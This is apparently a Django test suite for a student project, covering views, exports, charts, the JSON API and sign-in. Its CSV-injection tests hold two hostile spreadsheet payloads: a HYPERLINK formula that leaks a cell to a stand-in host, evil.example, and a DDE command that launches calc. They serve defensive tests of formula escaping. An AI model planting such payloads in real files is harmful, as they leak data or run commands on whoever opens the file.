"""
Tests for the whole project:

  * ItemViewTests           the four view kinds and the shared templates (previous assignment)
  * NavigationAndUrlTests   Section 1 -- the home page, named routes, get_absolute_url()
  * OrmQueryTests           Section 2 -- search, relationship spanning, aggregation
  * StaticFilesTests        Section 3 -- the custom stylesheet is configured and linked
  * ChartTests              Section 4 -- the matplotlib PNG endpoints
  * FormTests               Section 5 -- the GET form, the POST forms, CSRF
  * ApiTests                Section 6 -- the JSON API, filtering, and JsonResponse vs HttpResponse
  * ExportAndReportTests    A4 Part 3 -- the CSV/JSON exports and the reports page
  * VegaLiteTests           A4 Part 1 -- chart feeds, spec files, chart pages / specs / PNGs
  * ExternalApiTests        A4 Part 2 -- Nager.Date triangulation (network mocked, never called)
  * CorsTests               the /api/ and /vega-lite/ endpoints are readable cross-origin
  * AuthenticationTests     A5 Part 1 -- the access boundary itself: who is turned away, who
                            is let in, what the navigation shows, and that log in / sign up /
                            log out actually work
  * PublicApiSubmissionTests A5 Part 3 -- the one public endpoint, and whether the submitted
                            Vega-Lite spec and the three alternative-use programs in docs/a5/
                            still agree with what that endpoint actually returns

A note on SignedInClientMixin, because it touches almost every class in this file. Assignment
5 put @login_required and LoginRequiredMixin on every view that returns real data, and these
tests were all written against an anonymous client, so most of them started receiving a 302 to
the login page instead of the page they were asserting about. The fix is in the CLIENT, not in
the protection: the mixin signs a throwaway user in before each test, so the assertions below
go on meaning exactly what they meant before. None of them was weakened and none was deleted.
The class that proves the protection is real is AuthenticationTests at the bottom, and it is
the one class here that deliberately does NOT sign in.

Run with:  python manage.py test
Django builds a throwaway database for these, so your local db.sqlite3 is untouched.
"""

import csv
import io
import json
import re
from datetime import date, datetime, timedelta
from pathlib import Path
from unittest import mock

import requests
from urllib.parse import quote

from django.conf import settings
from django.contrib.auth.models import User
from django.contrib.staticfiles import finders
from django.templatetags.static import static
from django.shortcuts import resolve_url
from django.test import Client, TestCase, override_settings
from django.urls import reverse
from django.utils import timezone

from .models import Brief, BriefItem, Connection, Message, Person, Space
from .views import VEGA_CHARTS, VEGA_LITE_DIR, csv_safe

LIST_ROUTES = [
    "item-list-manual",        # 1. FBV, HttpResponse
    "item-list-render",        # 2. FBV, render()
    "item-list-cbv-base",      # 3. base CBV
    "item-list-cbv-generic",   # 4. generic ListView
]


# Credentials for the one account these tests use. Constants rather than literals in twelve
# places, and the password is deliberately long enough to clear AUTH_PASSWORD_VALIDATORS -- a
# short one would be rejected by the signup test and silently fine everywhere else, which is a
# confusing half-failure.
TEST_USERNAME = "signed-in-tester"
TEST_PASSWORD = "correct-horse-battery-staple-490"


def demo_owner():
    """
    The account that owns every row _build_demo_rows() writes, created once per test.

    It used to be two accounts: _build_demo_rows() made a "tester" who owned the Space, and
    SignedInClientMixin signed in a second, different account that owned nothing -- which was
    fine, and was even written down as a small free assertion that the site did not require
    ownership of a row to read it.

    That is exactly what Assignment 5 fixed. views.py now scopes every queryset to the
    requesting user (the owned_*() helpers), so an account that owns nothing correctly sees
    nothing, and sixty tests that assert "the page shows the demo item" would have been
    asserting about somebody else's rows. Merging the two accounts is the honest fix: the
    client is signed in as the person whose data the assertions are about. The case the old
    arrangement accidentally covered -- one user reading another's rows -- is now covered
    deliberately and by name in TenantIsolationTests.

    get_or_create rather than create_user, because setUpTestData (class scope) and
    SignedInClientMixin.setUp (test scope) both reach for this account, in that order.
    """
    owner, created = User.objects.get_or_create(username=TEST_USERNAME)
    if created:
        owner.set_password(TEST_PASSWORD)
        owner.save()
    return owner


def _build_demo_rows():
    """
    The smallest database that still exercises the whole spine:
    one work space, one brief, two items in two lanes, and one message with an author, so the
    relationship-spanning queries and the "receipts" have something to walk.

    Returns the Needs-you item, which is the one most tests act on.
    """
    now = timezone.now()
    user = demo_owner()
    space = Space.objects.create(user=user, kind=Space.Kind.WORK)
    brief = Brief.objects.create(
        space=space, window_start=now - timedelta(hours=8), window_end=now,
        trigger=Brief.Trigger.ON_DEMAND, status=Brief.Status.READY,
        headline="Two things to look at.",
    )
    # Created FYI first on purpose: every list must still show Needs-you first.
    BriefItem.objects.create(
        brief=brief, title="FYI item", lane=BriefItem.Lane.FYI, rank=1,
        summary="just so you know",
    )
    needs = BriefItem.objects.create(
        brief=brief, title="Needs item", lane=BriefItem.Lane.NEEDS_YOU, rank=1,
        summary="act on this",
    )
    connection = Connection.objects.create(
        space=space, provider="gmail", external_account="a@b.example"
    )
    person = Person.objects.create(
        space=space, display_name="Pat", handles=["pat@example.invalid", "@pat"]
    )
    message = Message.objects.create(
        connection=connection, author=person, external_id="m-1", sent_at=now,
        body="the receipt text",
    )
    needs.messages.add(message)
    return needs


class SignedInClientMixin:
    """
    Sign the test client in before every test in the class, as the demo data's OWNER.

    Mixed into every class whose subject is a protected page. It hooks setUp rather than
    setUpTestData for two reasons: self.client only exists on the instance, and anything
    created here lives inside the per-test transaction, so each test still starts from the
    same database state the class was built with.

    The account is demo_owner() -- the same one _build_demo_rows() hangs its Space off -- and
    that identity is now load-bearing rather than incidental. A5 scoped every queryset to the
    requesting user, so signing in as anybody else would make every assertion below about an
    empty page. See demo_owner()'s docstring for the arrangement this replaced.
    """

    def setUp(self):
        super().setUp()
        self.account = demo_owner()
        # force_login skips the password check and the login form on purpose: these tests are
        # about the pages, not about authentication. AuthenticationTests posts the real form.
        self.client.force_login(self.account)


class ItemViewTests(SignedInClientMixin, TestCase):
    @classmethod
    def setUpTestData(cls):
        now = timezone.now()
        user = demo_owner()
        space = Space.objects.create(user=user, kind=Space.Kind.WORK)
        brief = Brief.objects.create(
            space=space, window_start=now - timedelta(hours=8), window_end=now,
            trigger=Brief.Trigger.ON_DEMAND, status=Brief.Status.READY,
        )
        # Created FYI first on purpose: the list must still show Needs-you first.
        cls.fyi = BriefItem.objects.create(
            brief=brief, title="FYI item", lane=BriefItem.Lane.FYI, rank=1, summary="just so you know")
        cls.needs = BriefItem.objects.create(
            brief=brief, title="Needs item", lane=BriefItem.Lane.NEEDS_YOU, rank=1, summary="act on this")

        connection = Connection.objects.create(space=space, provider="gmail", external_account="a@b.example")
        person = Person.objects.create(space=space, display_name="Pat")
        message = Message.objects.create(
            connection=connection, author=person, external_id="m-1", sent_at=now, body="the receipt text")
        cls.needs.messages.add(message)

    # ---- routing -------------------------------------------------------------------
    def test_every_route_has_a_name_that_resolves(self):
        for name in LIST_ROUTES:
            with self.subTest(route=name):
                self.assertTrue(reverse(name).startswith("/items/"))
        self.assertEqual(reverse("item-detail", args=[self.needs.pk]), f"/items/{self.needs.pk}/")

    # ---- the four view kinds -------------------------------------------------------
    def test_all_four_list_views_work_and_share_templates(self):
        for name in LIST_ROUTES:
            with self.subTest(route=name):
                response = self.client.get(reverse(name))
                self.assertEqual(response.status_code, 200)
                self.assertTemplateUsed(response, "unopsis/briefitem_list.html")
                self.assertTemplateUsed(response, "base.html")   # template inheritance works
                self.assertContains(response, "Needs item")
                self.assertContains(response, "FYI item")

    def test_needs_you_is_listed_before_fyi_in_every_view(self):
        for name in LIST_ROUTES:
            with self.subTest(route=name):
                html = self.client.get(reverse(name)).content.decode()
                self.assertLess(html.index("Needs item"), html.index("FYI item"))

    # ---- loop + {% empty %} --------------------------------------------------------
    def test_empty_state_when_a_filter_matches_nothing(self):
        for name in LIST_ROUTES:
            with self.subTest(route=name):
                response = self.client.get(reverse(name), {"state": "snoozed"})
                self.assertContains(response, "Nothing needs you here")
                self.assertContains(response, "Clear filters")
                self.assertNotContains(response, "Needs item")

    def test_empty_state_when_there_are_no_items_at_all(self):
        BriefItem.objects.all().delete()
        response = self.client.get(reverse("item-list-cbv-generic"))
        self.assertContains(response, "Nothing needs you here")
        self.assertContains(response, "seed_demo")

    # ---- detail --------------------------------------------------------------------
    def test_detail_view_shows_the_receipts(self):
        response = self.client.get(reverse("item-detail", args=[self.needs.pk]))
        self.assertEqual(response.status_code, 200)
        self.assertTemplateUsed(response, "unopsis/briefitem_detail.html")
        self.assertContains(response, "the receipt text")

    def test_detail_view_returns_404_for_a_missing_item(self):
        self.assertEqual(self.client.get(reverse("item-detail", args=[99999])).status_code, 404)


class NavigationAndUrlTests(SignedInClientMixin, TestCase):
    """Section 1: the home page, the named routes, and get_absolute_url()."""

    @classmethod
    def setUpTestData(cls):
        cls.item = _build_demo_rows()

    def test_root_url_is_a_real_page_not_a_404(self):
        response = self.client.get("/")
        self.assertEqual(response.status_code, 200)
        self.assertTemplateUsed(response, "unopsis/home.html")

    def test_home_is_reachable_by_its_route_name(self):
        self.assertEqual(reverse("home"), "/")

    def test_navigation_links_to_at_least_three_named_routes(self):
        html = self.client.get(reverse("home")).content.decode()
        for name in ("home", "brief-list", "item-list-cbv-generic", "insights", "api-items"):
            with self.subTest(route=name):
                self.assertIn(f'href="{reverse(name)}"', html)

    def test_get_absolute_url_reverses_the_named_detail_route(self):
        self.assertEqual(self.item.get_absolute_url(), f"/items/{self.item.pk}/")
        self.assertEqual(self.item.brief.get_absolute_url(), f"/briefs/{self.item.brief.pk}/")

    def test_templates_link_through_get_absolute_url(self):
        html = self.client.get(reverse("item-list-cbv-generic")).content.decode()
        self.assertIn(f'href="{self.item.get_absolute_url()}"', html)

    def test_detail_pages_are_found_by_primary_key(self):
        self.assertEqual(self.client.get(self.item.get_absolute_url()).status_code, 200)
        self.assertEqual(self.client.get(self.item.brief.get_absolute_url()).status_code, 200)
        self.assertEqual(self.client.get("/briefs/99999/").status_code, 404)


class OrmQueryTests(SignedInClientMixin, TestCase):
    """Section 2: search, relationship spanning and aggregation."""

    @classmethod
    def setUpTestData(cls):
        cls.item = _build_demo_rows()

    def test_get_search_filters_and_keeps_the_query_in_the_url(self):
        response = self.client.get(reverse("insights"), {"q": "act on this"})
        self.assertContains(response, "Needs item")
        self.assertNotContains(response, "FYI item")

    def test_get_search_spans_relationships_to_the_message_author(self):
        response = self.client.get(reverse("insights"), {"author": "Pat"})
        self.assertContains(response, "Needs item")
        self.assertNotContains(response, "FYI item")

    def test_get_search_with_no_matches_shows_the_empty_state(self):
        response = self.client.get(reverse("insights"), {"q": "nothing-matches-this"})
        self.assertContains(response, "No items match")

    def test_aggregations_are_on_the_page(self):
        response = self.client.get(reverse("insights"))
        summaries = response.context["summaries"]
        self.assertEqual(summaries["total_items"], 2)
        by_lane = {row["lane"]: row["total"] for row in summaries["by_lane"]}
        self.assertEqual(by_lane, {"needs_you": 1, "fyi": 1})
        self.assertEqual(
            {row["brief__space__kind"]: row["total"] for row in summaries["by_space"]},
            {"work": 2},
        )
        self.assertEqual(summaries["by_provider"][0]["total"], 1)


class FormTests(SignedInClientMixin, TestCase):
    """Section 5: the GET form, the POST forms and CSRF."""

    @classmethod
    def setUpTestData(cls):
        cls.item = _build_demo_rows()

    def test_post_lookup_finds_a_person_without_putting_the_query_in_the_url(self):
        response = self.client.post(reverse("insights"), {"handle": "pat@example.invalid"})
        self.assertEqual(response.status_code, 200)          # rendered, not redirected
        self.assertContains(response, "Pat")
        self.assertTrue(response.context["lookup_ran"])

    def test_post_updates_an_item_and_redirects(self):
        response = self.client.post(
            self.item.get_absolute_url(), {"state": "handled", "draft_body": "on it"}
        )
        self.assertRedirects(response, self.item.get_absolute_url())
        self.item.refresh_from_db()
        self.assertEqual(self.item.state, BriefItem.State.HANDLED)
        self.assertEqual(self.item.draft_body, "on it")
        self.assertIsNotNone(self.item.handled_at)

    def test_post_creates_an_item_on_a_brief(self):
        brief = self.item.brief
        before = brief.items.count()
        response = self.client.post(
            brief.get_absolute_url(),
            {"title": "Brand new item", "lane": "fyi", "rank": "7", "summary": "created by a form"},
        )
        self.assertRedirects(response, brief.get_absolute_url())
        self.assertEqual(brief.items.count(), before + 1)

    def test_a_duplicate_slot_is_a_form_error_not_a_crash(self):
        brief = self.item.brief
        response = self.client.post(
            brief.get_absolute_url(),
            {"title": "Another item", "lane": self.item.lane, "rank": self.item.rank,
             "summary": "collides with an existing slot"},
        )
        self.assertEqual(response.status_code, 200)
        self.assertContains(response, "already has")

    def test_post_forms_carry_a_csrf_token(self):
        for url in (self.item.get_absolute_url(), self.item.brief.get_absolute_url(),
                    reverse("insights")):
            with self.subTest(url=url):
                self.assertContains(self.client.get(url), "csrfmiddlewaretoken")

    def test_post_without_a_csrf_token_is_rejected(self):
        client = Client(enforce_csrf_checks=True)
        # Signed in deliberately: an anonymous POST would be turned away at the login
        # redirect before CSRF was ever checked, and this test would pass for the wrong
        # reason -- it would stop proving anything about CSRF at all.
        client.force_login(self.account)
        response = client.post(self.item.get_absolute_url(), {"state": "handled"})
        self.assertEqual(response.status_code, 403)


class ChartTests(SignedInClientMixin, TestCase):
    """Section 4: the matplotlib endpoints."""

    @classmethod
    def setUpTestData(cls):
        cls.item = _build_demo_rows()

    def test_chart_urls_return_a_real_png(self):
        for name in ("chart-lanes", "chart-providers"):
            with self.subTest(chart=name):
                response = self.client.get(reverse(name))
                self.assertEqual(response.status_code, 200)
                self.assertEqual(response["Content-Type"], "image/png")
                # The first eight bytes of every PNG file.
                self.assertTrue(response.content.startswith(b"\x89PNG\r\n\x1a\n"))
                self.assertGreater(len(response.content), 1000)

    def test_the_page_embeds_the_charts_with_alt_text(self):
        html = self.client.get(reverse("insights")).content.decode()
        self.assertIn(f'src="{reverse("chart-lanes")}"', html)
        self.assertIn(f'src="{reverse("chart-providers")}"', html)
        self.assertIn("alt=\"Grouped bar chart", html)


class ApiTests(SignedInClientMixin, TestCase):
    """Section 6: the JSON API, its filtering, and the MIME types."""

    @classmethod
    def setUpTestData(cls):
        cls.item = _build_demo_rows()

    def test_json_api_returns_json(self):
        response = self.client.get(reverse("api-items"))
        self.assertEqual(response["Content-Type"], "application/json")
        payload = response.json()
        self.assertEqual(payload["count"], 2)
        titles = [row["title"] for row in payload["results"]]
        self.assertEqual(titles, ["Needs item", "FYI item"])   # needs-you first
        self.assertEqual(payload["results"][0]["url"], self.item.get_absolute_url())

    def test_api_filters_on_query_parameters(self):
        payload = self.client.get(reverse("api-items"), {"lane": "fyi"}).json()
        self.assertEqual(payload["count"], 1)
        self.assertEqual(payload["results"][0]["title"], "FYI item")
        self.assertEqual(self.client.get(reverse("api-items"), {"q": "act on"}).json()["count"], 1)
        self.assertEqual(
            self.client.get(reverse("api-items"), {"space": "personal"}).json()["count"], 0
        )

    def test_the_class_based_api_returns_the_same_rows(self):
        fbv = self.client.get(reverse("api-items")).json()["results"]
        cbv = self.client.get(reverse("api-items-cbv")).json()["results"]
        self.assertEqual([r["id"] for r in fbv], [r["id"] for r in cbv])

    def test_insights_api_aggregates_and_validates_its_parameter(self):
        payload = self.client.get(reverse("api-insights")).json()
        self.assertEqual(payload["totals"]["items"], 2)
        self.assertEqual(
            {row["lane"]: row["total"] for row in payload["items_by_lane"]},
            {"needs_you": 1, "fyi": 1},
        )
        bad = self.client.get(reverse("api-insights"), {"space": "nope"})
        self.assertEqual(bad.status_code, 400)

    def test_httpresponse_and_jsonresponse_differ_only_in_content_type(self):
        as_json = self.client.get(reverse("api-items"))
        as_text = self.client.get(reverse("api-items-text"))
        as_csv = self.client.get(reverse("api-items-csv"))
        self.assertEqual(as_json["Content-Type"], "application/json")
        self.assertEqual(as_text["Content-Type"], "text/plain; charset=utf-8")
        self.assertEqual(as_csv["Content-Type"], "text/csv")
        # Same rows underneath the three different MIME types.
        self.assertEqual(
            json.loads(as_text.content)["results"][0]["title"],
            as_json.json()["results"][0]["title"],
        )
        self.assertIn("Needs item", as_csv.content.decode())


class StaticFilesTests(TestCase):
    """Section 3: the stylesheet is configured and actually linked."""

    def test_the_custom_stylesheet_is_found_by_the_staticfiles_finders(self):
        self.assertIsNotNone(finders.find("css/unopsis.css"))
        self.assertIsNotNone(finders.find("img/unopsis-logo.svg"))

    def test_every_page_links_the_stylesheet_through_the_static_tag(self):
        html = self.client.get(reverse("home")).content.decode()
        self.assertIn(f'href="{static("css/unopsis.css")}"', html)
        self.assertIn(f'src="{static("img/unopsis-logo.svg")}"', html)


class ExportAndReportTests(SignedInClientMixin, TestCase):
    """
    Assignment 4, Part 3: the CSV export, the JSON export and the reports page.

    A new class rather than additions to ApiTests, because these are not the API: ApiTests
    pins the Assignment-3 endpoints, whose headers must not move. What is asserted here is
    everything a marker would click on -- the two Content-Types, both timestamped
    Content-Disposition filenames, the CSV header row, the JSON metadata keys, and that the
    reports page actually renders the summaries, a totals line and both buttons.
    """

    # "brief_items_2026-10-05_14-30.csv": the shape the rubric asks for, as a regex rather
    # than a fixed string, because the stamp is the current clock and cannot be hard-coded.
    FILENAME_PATTERN = r'^attachment; filename="brief_items_\d{4}-\d{2}-\d{2}_\d{2}-\d{2}\.%s"$'

    @classmethod
    def setUpTestData(cls):
        cls.item = _build_demo_rows()

    # ---- CSV export ------------------------------------------------------------------
    def test_csv_export_is_served_as_a_downloadable_csv_file(self):
        response = self.client.get(reverse("export-items-csv"))
        self.assertEqual(response.status_code, 200)
        self.assertEqual(response["Content-Type"], "text/csv")
        self.assertRegex(response["Content-Disposition"], self.FILENAME_PATTERN % "csv")

    def test_csv_export_starts_with_a_header_row_then_the_rows_in_order(self):
        rows = list(csv.reader(io.StringIO(
            self.client.get(reverse("export-items-csv")).content.decode()
        )))
        self.assertEqual(rows[0][:5], ["id", "title", "lane", "lane_label", "rank"])
        self.assertEqual(rows[0][-1], "url")
        # Two items in the fixture, Needs-you before FYI: the defined order, not insertion order.
        self.assertEqual(len(rows), 3)
        self.assertEqual([row[1] for row in rows[1:]], ["Needs item", "FYI item"])
        # Every data row is exactly as wide as the header, or a spreadsheet would misalign.
        for row in rows[1:]:
            self.assertEqual(len(row), len(rows[0]))

    # ---- JSON export -----------------------------------------------------------------
    def test_json_export_is_served_as_a_downloadable_json_file(self):
        response = self.client.get(reverse("export-items-json"))
        self.assertEqual(response.status_code, 200)
        self.assertEqual(response["Content-Type"], "application/json")
        self.assertRegex(response["Content-Disposition"], self.FILENAME_PATTERN % "json")

    def test_json_export_carries_its_metadata_and_the_records(self):
        payload = self.client.get(reverse("export-items-json")).json()
        self.assertEqual(
            set(payload), {"generated_at", "record_count", "brief_items"}
        )
        # generated_at must be a real ISO timestamp, not a prettified string.
        self.assertIsNotNone(datetime.fromisoformat(payload["generated_at"]))
        self.assertEqual(payload["record_count"], 2)
        self.assertEqual(payload["record_count"], len(payload["brief_items"]))
        self.assertEqual(payload["brief_items"][0]["title"], "Needs item")
        self.assertEqual(payload["brief_items"][0]["url"], self.item.get_absolute_url())

    def test_json_export_is_pretty_printed(self):
        body = self.client.get(reverse("export-items-json")).content.decode()
        self.assertIn('\n  "record_count"', body)   # indent=2, not one dense line

    def test_both_exports_describe_the_same_rows_in_the_same_order(self):
        csv_rows = list(csv.reader(io.StringIO(
            self.client.get(reverse("export-items-csv")).content.decode()
        )))[1:]
        json_rows = self.client.get(reverse("export-items-json")).json()["brief_items"]
        self.assertEqual([row[0] for row in csv_rows], [str(r["id"]) for r in json_rows])

    def test_the_exports_are_a_whole_snapshot_not_the_filtered_api_feed(self):
        # /api/items.csv honours ?lane=; the export deliberately does not, because a file
        # called "brief_items_<stamp>.csv" has to mean every brief item.
        filtered = self.client.get(reverse("api-items-csv"), {"lane": "fyi"})
        exported = self.client.get(reverse("export-items-csv"), {"lane": "fyi"})
        self.assertNotIn("Needs item", filtered.content.decode())
        self.assertIn("Needs item", exported.content.decode())

    # ---- the reports page ------------------------------------------------------------
    def test_reports_page_renders_through_the_base_template(self):
        response = self.client.get(reverse("reports"))
        self.assertEqual(response.status_code, 200)
        self.assertTemplateUsed(response, "unopsis/reports.html")
        self.assertTemplateUsed(response, "base.html")

    def test_reports_page_shows_the_grouped_summaries_and_a_totals_line(self):
        response = self.client.get(reverse("reports"))
        summaries = response.context["summaries"]
        self.assertEqual(summaries["total_items"], 2)
        self.assertEqual(
            {row["lane"]: row["total"] for row in summaries["by_lane"]},
            {"needs_you": 1, "fyi": 1},
        )
        html = response.content.decode()
        self.assertIn("Items per lane", html)
        self.assertIn("Messages per provider", html)   # at least two grouped summaries
        self.assertIn("Totals", html)
        self.assertIn("Needs you", html)               # a labelled group actually printed

    def test_reports_page_carries_both_download_buttons(self):
        html = self.client.get(reverse("reports")).content.decode()
        for name, label in (("export-items-csv", "Download CSV"),
                            ("export-items-json", "Download JSON")):
            with self.subTest(button=label):
                self.assertIn(f'href="{reverse(name)}"', html)
                self.assertIn(label, html)
        self.assertIn("btn", html)   # they are buttons, not bare links

    def test_reports_page_is_reachable_from_the_site_navigation(self):
        html = self.client.get(reverse("home")).content.decode()
        self.assertIn(f'href="{reverse("reports")}"', html)


class EmptyReportTests(SignedInClientMixin, TestCase):
    """
    The same page against an EMPTY database.

    Worth its own class with no setUpTestData: a report that renders a bare table on a fresh
    install looks broken, so every {% empty %} branch has to say something. This is also the
    only way to prove those branches exist -- with fixture rows loaded they never run.
    """

    def test_reports_page_still_renders_and_explains_the_emptiness(self):
        response = self.client.get(reverse("reports"))
        self.assertEqual(response.status_code, 200)
        self.assertContains(response, "No items to group yet.")
        self.assertContains(response, "No messages have arrived yet.")
        self.assertContains(response, "No briefs have been assembled yet.")

    def test_exports_of_an_empty_table_are_still_valid_files(self):
        csv_rows = list(csv.reader(io.StringIO(
            self.client.get(reverse("export-items-csv")).content.decode()
        )))
        self.assertEqual(len(csv_rows), 1)          # the header row alone, not an empty file
        payload = self.client.get(reverse("export-items-json")).json()
        self.assertEqual(payload["record_count"], 0)
        self.assertEqual(payload["brief_items"], [])


class CsvInjectionTests(SignedInClientMixin, TestCase):
    """
    The CSV export must not hand a spreadsheet something it will run as a formula.

    The path is real rather than theoretical: the create form on /briefs/<pk>/ takes free text,
    so a stored title is attacker-controlled input that ends up in a file a teammate opens in
    Excel. Assignment 5 put that form behind a login, which narrows who can plant the string
    but does not close the hole: sign-up is open, as it has to be, and the person who opens the
    downloaded file trusts it because it came from our own site.
    """

    @classmethod
    def setUpTestData(cls):
        cls.item = _build_demo_rows()

    def test_a_stored_formula_is_neutralised_in_the_csv(self):
        payload = '=HYPERLINK("http://evil.example/leak?c="&A1,"Click me")'
        self.client.post(
            self.item.brief.get_absolute_url(),
            {"title": payload, "lane": "fyi", "rank": "77", "summary": "harmless"},
        )
        self.assertTrue(BriefItem.objects.filter(title=payload).exists())  # stored as typed

        body = self.client.get(reverse("export-items-csv")).content.decode()
        row = next(line for line in body.splitlines() if "HYPERLINK" in line)
        cell = next(c for c in csv.reader(io.StringIO(row)))[1]
        self.assertTrue(cell.startswith("'"), f"formula not neutralised: {cell!r}")
        self.assertFalse(cell.startswith("="))

    def test_every_formula_trigger_character_is_covered(self):
        for lead in ("=", "+", "-", "@", "\t", "\r"):
            with self.subTest(lead=lead):
                self.assertEqual(csv_safe(lead + "danger"), "'" + lead + "danger")

    def test_ordinary_values_are_left_exactly_as_they_are(self):
        for value in ("Thesis draft", "Invoice #4471", "", None, 42):
            with self.subTest(value=value):
                self.assertEqual(csv_safe(value), value)

    def test_both_csv_endpoints_neutralise_it_not_just_the_export(self):
        """
        The regression this guards against is the one that actually happened.

        This project serves CSV from TWO routes -- /export/brief-items.csv and /api/items.csv
        -- and they grew up in different assignments. The export ran every cell through
        csv_safe(); the API endpoint wrote item.title straight into the row. Both answer
        Content-Type: text/csv with Content-Disposition: attachment, so both produce a file
        that Excel and Sheets open and both evaluate a leading = as a formula. A defence on one
        of two identical doors is the usual way a defence fails: not removed, just never copied
        to the sibling.

        Asserting over BOTH urls in one loop is the point. Two separate tests would drift apart
        again; this one cannot pass for a new CSV route that nobody added to the list, because
        adding the route is what adds the assertion.
        """
        payload = '=cmd|\' /C calc\'!A0'
        self.client.post(
            self.item.brief.get_absolute_url(),
            {"title": payload, "lane": "fyi", "rank": "66", "summary": "harmless"},
        )
        self.assertTrue(BriefItem.objects.filter(title=payload).exists())

        for route in ("export-items-csv", "api-items-csv"):
            with self.subTest(route=route):
                response = self.client.get(reverse(route))
                self.assertEqual(response["Content-Type"], "text/csv")
                rows = list(csv.reader(io.StringIO(response.content.decode())))
                cells = [cell for row in rows for cell in row if "calc" in cell]
                self.assertTrue(cells, f"the hostile title never reached {route}")
                for cell in cells:
                    self.assertTrue(
                        cell.startswith("'"), f"{route} did not neutralise {cell!r}"
                    )

    def test_the_json_export_is_not_mangled(self):
        """JSON has no formula evaluator, so prefixing there would be data loss for no gain."""
        payload = "=1+1"
        self.client.post(
            self.item.brief.get_absolute_url(),
            {"title": payload, "lane": "fyi", "rank": "88", "summary": "harmless"},
        )
        payload_rows = [
            row for row in self.client.get(reverse("export-items-json")).json()["brief_items"]
            if row["title"].endswith("1+1")
        ]
        self.assertEqual(payload_rows[0]["title"], payload)


class VegaLiteTests(SignedInClientMixin, TestCase):
    """
    Assignment 4, Part 1: the chart-ready feeds, the spec files, and each chart's three outputs.

    The rule the assignment is strictest about is pinned here: every spec loads its data with
    "data": {"url": ...} and none carries inline "values".
    """

    @classmethod
    def setUpTestData(cls):
        cls.item = _build_demo_rows()

    def test_items_by_lane_feed_is_a_flat_array_with_every_lane(self):
        response = self.client.get(reverse("api-items-by-lane"))
        self.assertEqual(response["Content-Type"], "application/json")
        rows = response.json()
        self.assertIsInstance(rows, list)
        self.assertEqual([row["lane"] for row in rows], ["needs_you", "moving", "fyi"])
        self.assertEqual({row["lane"]: row["total"] for row in rows},
                         {"needs_you": 1, "moving": 0, "fyi": 1})

    def test_messages_by_hour_feed_fills_quiet_hours_with_zero(self):
        connection = Connection.objects.get()
        person = Person.objects.get()
        first = Message.objects.get().sent_at
        Message.objects.create(connection=connection, author=person, external_id="m-2",
                               sent_at=first + timedelta(hours=3), body="later")
        rows = self.client.get(reverse("api-messages-by-hour")).json()
        self.assertEqual([row["total"] for row in rows], [1, 0, 0, 1])
        hours = [datetime.fromisoformat(row["hour"]) for row in rows]
        self.assertEqual(hours[1] - hours[0], timedelta(hours=1))

    def test_every_spec_file_loads_its_data_by_url_and_never_inline(self):
        for chart, config in VEGA_CHARTS.items():
            with self.subTest(chart=chart):
                spec = json.loads((VEGA_LITE_DIR / config["spec_file"]).read_text("utf-8"))
                self.assertIn("url", spec["data"])
                self.assertNotIn("values", spec["data"])
                # The path in the file is a real route of ours, not a typo that 404s.
                self.assertEqual(self.client.get(spec["data"]["url"]).status_code, 200)

    def test_one_bar_chart_and_one_line_chart(self):
        marks = set()
        for config in VEGA_CHARTS.values():
            spec = json.loads((VEGA_LITE_DIR / config["spec_file"]).read_text("utf-8"))
            marks.add(spec["mark"]["type"] if isinstance(spec["mark"], dict) else spec["mark"])
        self.assertEqual(marks, {"bar", "line"})

    def test_served_spec_has_an_absolute_data_url_for_the_vega_lite_editor(self):
        spec = self.client.get(reverse("vega-chart-spec", args=["chart1"])).json()
        self.assertEqual(spec["data"]["url"],
                         "http://testserver" + reverse("api-items-by-lane"))

    def test_each_chart_has_its_own_page_that_embeds_the_spec(self):
        for chart in VEGA_CHARTS:
            with self.subTest(chart=chart):
                response = self.client.get(reverse("vega-chart-page", args=[chart]))
                self.assertEqual(response.status_code, 200)
                self.assertTemplateUsed(response, "base.html")
                self.assertContains(
                    response, f'data-vega-spec="{reverse("vega-chart-spec", args=[chart])}"'
                )

    def test_each_chart_is_rendered_to_a_real_png(self):
        for chart in VEGA_CHARTS:
            with self.subTest(chart=chart):
                response = self.client.get(reverse("vega-chart-png", args=[chart]))
                self.assertEqual(response.status_code, 200)
                self.assertEqual(response["Content-Type"], "image/png")
                self.assertTrue(response.content.startswith(b"\x89PNG\r\n\x1a\n"))

    def test_an_unknown_chart_is_a_404_on_every_endpoint(self):
        for name in ("vega-chart-page", "vega-chart-spec", "vega-chart-png"):
            with self.subTest(route=name):
                self.assertEqual(self.client.get(reverse(name, args=["chart9"])).status_code, 404)

    def test_insights_page_embeds_both_charts_without_inline_data(self):
        html = self.client.get(reverse("insights")).content.decode()
        for chart in VEGA_CHARTS:
            self.assertIn(f'data-vega-spec="{reverse("vega-chart-spec", args=[chart])}"', html)
        self.assertNotIn('"values"', html)


def _fake_nager(url, params=None, timeout=None):
    """
    Stand-in for requests.get() against Nager.Date: a fixed 2026 US calendar.

    Thanksgiving (Thursday 26 Nov) with Friday 27 Nov as a bridge day makes a four-day weekend,
    and New Year's Day is there so "nearest holiday" has more than one candidate.
    """
    response = mock.Mock()
    response.status_code = 200
    response.raise_for_status.return_value = None
    if "/ZZ" in url:
        response.status_code = 404
    elif "PublicHolidays" in url:
        response.json.return_value = [
            {"date": "2026-01-01", "localName": "New Year's Day"},
            {"date": "2026-11-26", "localName": "Thanksgiving Day"},
        ]
    else:
        response.json.return_value = [
            {"startDate": "2026-11-26", "endDate": "2026-11-29", "dayCount": 4,
             "needBridgeDay": True, "bridgeDays": ["2026-11-27"]},
        ]
    return response


def _midnight(day):
    return timezone.make_aware(datetime.combine(day, datetime.min.time()))


@mock.patch("unopsis.views.timezone.localdate", return_value=date(2026, 10, 5))
@mock.patch("unopsis.views.requests.get", side_effect=_fake_nager)
class ExternalApiTests(SignedInClientMixin, TestCase):
    """
    Assignment 4, Part 2: deadlines triangulated against Nager.Date.

    requests.get is replaced for the whole class, so the suite never touches the network (CI
    and offline laptops pass) and the calendar is fixed, which makes the analysis checkable.
    """

    @classmethod
    def setUpTestData(cls):
        needs = _build_demo_rows()
        needs.deadline_at = _midnight(date(2026, 11, 26))    # Thanksgiving, a Thursday
        needs.save()
        fyi = BriefItem.objects.get(title="FYI item")
        fyi.deadline_at = _midnight(date(2026, 10, 14))      # an ordinary Wednesday
        fyi.save()

    def test_requests_get_is_called_with_params_and_a_timeout(self, get, _today):
        self.client.get(reverse("api-deadline-holidays"), {"country": "us", "bridge_days": "2"})
        for call in get.call_args_list:
            self.assertEqual(call.kwargs["timeout"], 5)
            self.assertIn("params", call.kwargs)
